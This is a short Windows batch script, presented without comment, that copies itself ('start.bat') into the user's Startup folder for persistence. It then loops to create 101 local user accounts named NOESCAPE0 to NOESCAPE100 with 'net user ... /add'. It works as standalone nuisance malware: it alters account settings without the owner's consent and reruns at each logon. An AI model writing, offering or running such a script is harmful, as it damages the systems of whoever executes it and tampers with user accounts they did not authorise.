@echo off
copy "./start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

Set /a loop = 0

:loopstart
ping 127.0.0.1 -n 1 -w 50 >nul
net user NOESCAPE%loop% /add

ping 127.0.0.1 -n 1 -w 50 >nul
goto check

:check
if %loop% == 100 goto done
echo %loop%
Set /a loop += 1
goto loopstart

:done
exit
